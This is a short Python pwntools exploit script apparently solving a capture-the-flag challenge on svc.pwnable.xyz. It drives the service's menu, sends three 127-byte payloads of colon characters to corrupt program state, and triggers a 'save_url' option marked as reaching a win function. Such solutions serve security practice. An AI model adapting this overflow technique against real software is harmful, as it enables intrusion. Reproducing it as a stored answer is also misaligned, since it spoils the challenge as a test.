from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30021)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def login(passwd):
	sla('>','1')
	sa(':',passwd)

def create_url(url,size,data):
	sla('>','2')
	sa(':',url)
	sa(':',str(size))
	p.send(data)

def print_url():
	sla('>','3')

def save_url(): # win()
	sla('>','4')

def quit():
	sla('>','0')

create_url('https',127,':'*127)
create_url('https',127,':'*127)
create_url('https',127,':'*127)
#login(str(0x3a3a3a3a3a3a3a3a))
save_url()

p.interactive()